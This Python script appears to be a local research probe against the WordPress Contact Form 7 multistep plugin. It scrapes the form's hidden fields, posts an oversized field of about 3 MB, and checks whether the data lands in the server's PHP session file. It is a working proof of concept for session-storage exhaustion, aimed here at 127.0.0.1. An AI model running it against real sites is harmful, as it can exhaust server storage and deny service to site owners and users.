#!/usr/bin/env python3
import http.client, re, sys, time, os, json, html as htmlmod
from urllib.parse import urlencode
HOST='127.0.0.1'; PORT=28891
SESS='/tmp/opencode/research/wprealhex_20261022T011837Z/sessions'
sid=sys.argv[1] if len(sys.argv)>1 else 'cf7sess'
size=int(sys.argv[2]) if len(sys.argv)>2 else 3000000
marker='CF7MARK_'+sid
# fresh GET for hidden fields
c=http.client.HTTPConnection(HOST,PORT,timeout=180); c.request('GET','/oc-cf7-step1/',headers={'Cookie':'PHPSESSID='+sid,'User-Agent':'Mozilla/5.0'}); r=c.getresponse(); html=r.read().decode('utf-8','replace'); c.close()
def hid(name):
    m=re.search(r'name="%s"[^>]*value="([^"]*)"'%re.escape(name),html)
    return htmlmod.unescape(m.group(1)) if m else ''
fields=[('_wpcf7',hid('_wpcf7')),('_wpcf7_version',hid('_wpcf7_version')),('_wpcf7_locale',hid('_wpcf7_locale')),
        ('_wpcf7_unit_tag',hid('_wpcf7_unit_tag')),('_wpcf7_container_post',hid('_wpcf7_container_post')),
        ('_wpcf7_posted_data_hash',''),('_cf7msm_multistep_tag',hid('_cf7msm_multistep_tag')),('cf7msm_options',hid('_cf7msm_multistep_tag')),('cf7msm-no-ss',''),
        ('bigfield',marker+'_'+('Z'*size))]
body=urlencode(fields).encode()
print('GET',r.status,'POST bytes',len(body),'marker',marker)
c=http.client.HTTPConnection(HOST,PORT,timeout=300)
c.request('POST','/oc-cf7-step1/',body=body,headers={'Cookie':'PHPSESSID='+sid,'Content-Type':'application/x-www-form-urlencoded','Referer':'http://127.0.0.1:28891/oc-cf7-step1/','User-Agent':'Mozilla/5.0'})
r=c.getresponse(); data=r.read(); hdrs=r.getheaders(); c.close()
print('POST status',r.status,'resp bytes',len(data),'location',dict(hdrs).get('Location'))
for k,v in hdrs:
    if k.lower() in ('set-cookie','content-type','location'):
        print('HDR',k,len(v) if k.lower()=='set-cookie' else v, (v[:80]+'...') if len(v)>80 else v)
sf=os.path.join(SESS,'sess_'+sid)
time.sleep(0.5)
if os.path.exists(sf):
    d=open(sf,'rb').read()
    print('session size',len(d),'marker',marker.encode() in d, 'head',d[:120])
else: print('session missing')
open('/tmp/opencode/cf7_post_resp_%s.html'%sid,'wb').write(data)
